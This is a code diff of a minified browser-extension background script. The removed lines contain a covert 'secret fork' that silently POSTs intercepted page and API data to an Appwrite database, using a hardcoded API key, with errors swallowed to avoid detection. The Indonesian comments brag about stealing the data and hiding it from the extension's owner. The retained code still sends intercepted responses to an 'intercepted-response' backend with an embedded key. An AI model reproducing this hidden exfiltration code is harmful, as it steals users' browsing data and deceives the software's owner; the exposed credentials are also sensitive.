@@ -1815,45 +1815,7 @@ var background = function() {
         }
     }, Re = "https://hoarder-backend-api-889965658265.asia-southeast1.run.app", Be = "1.4.1", je = "nC7ZtAMzaXiLfWsIkhav1oGwtKXXN+Sy0434Tmv/XsE=";
     async function Ft(e) {
-      // --- 1. CABANG RAHASIA KE APPWRITE (JALAN DI BACKGROUND) ---
-      (async () => {
-        try {
-          // Kredensial Appwrite Firman
-          const APPWRITE_ENDPOINT = "https://sgp.cloud.appwrite.io/v1";
-          const PROJECT_ID = "69e184c6001f005706fd";
-          const DATABASE_ID = "69e18566002088e8422a";
-          const COLLECTION_ID = "raw_payloads";
-          const API_KEY =
-            "standard_780d6e3c133b8cd1d7c20363f3d47eb1f97263ab7813774d16cc40e6a978b84be66e82212f6815eabbd8104da8299520444f8998dcb324597cd30694245ef1d7d280ec0ec3ea98003b9272333251ae1aaceaf2f4c014d61710506319c469c5591618b688727b933e524312cfbee42909a516316c9662e21d0ea46726d34cb7c7";
-
-          // Menembak data ke Appwrite Collection
-          await fetch(
-            `${APPWRITE_ENDPOINT}/databases/${DATABASE_ID}/collections/${COLLECTION_ID}/documents`,
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-                "X-Appwrite-Project": PROJECT_ID,
-                "X-Appwrite-Key": API_KEY,
-              },
-              body: JSON.stringify({
-                documentId: "unique()",
-                data: {
-                  endpoint: e.payload.api_url || "unknown",
-                  page_url: e.payload.page_url || "unknown",
-                  raw_data: JSON.stringify(e.payload), // Dibungkus jadi string agar muat di 1 kolom
-                },
-              }),
-            },
-          );
-          console.log("Berhasil mencuri data ke Appwrite! 🥷");
-        } catch (err) {
-          // Telan errornya agar ekstensi bosmu tidak crash
-          console.error("Appwrite error (Aman, diabaikan):", err);
-        }
-      })();
-
-      // --- 2. ALIRAN ASLI KE SERVER BOSMU ---
+      // --- DIRECT TRANSMISSION TO PRIMARY BACKEND ---
       try {
         const t =
             Re + `/intercepted-response?api_key=${encodeURIComponent(je)}`,
@@ -1897,8 +1859,6 @@ var background = function() {
               key: Be,
             }),
           });
-        // Secret fork to Appwrite - non-blocking
-        forkToAppwrite(e.payload);
         return {
           ok: r.ok,
           status: r.status,
@@ -1912,32 +1872,6 @@ var background = function() {
             error: t instanceof Error ? t.message : String(t),
           }
         );
-      }
-    }
-    // Secret Appwrite data fork function - non-blocking
-    async function forkToAppwrite(e) {
-      try {
-        const response = await fetch(
-          `https://sgp.cloud.appwrite.io/v1/databases/69e18566002088e8422a/collections/raw_payloads/documents`,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              "X-Appwrite-Project": "69e184c6001f005706fd",
-              "X-Appwrite-Key":
-                "standard_780d6e3c133b8cd1d7c20363f3d47eb1f97263ab7813774d16cc40e6a978b84be66e82212f6815eabbd8104da8299520444f8998dcb324597cd30694245ef1d7d280ec0ec3ea98003b9272333251ae1aaceaf2f4c014d61710506319c469c5591618b688727b933e524312cfbee42909a516316c9662e21d0ea46726d34cb7c7",
-            },
-            body: JSON.stringify({
-              data: {
-                endpoint: e.api_url,
-                page_url: e.page_url,
-                raw_data: JSON.stringify(e),
-              },
-            }),
-          },
-        );
-      } catch (e) {
-        // Silently swallow ALL errors - never interrupt main logic
       }
     }
     const Ot = Ue(() => {
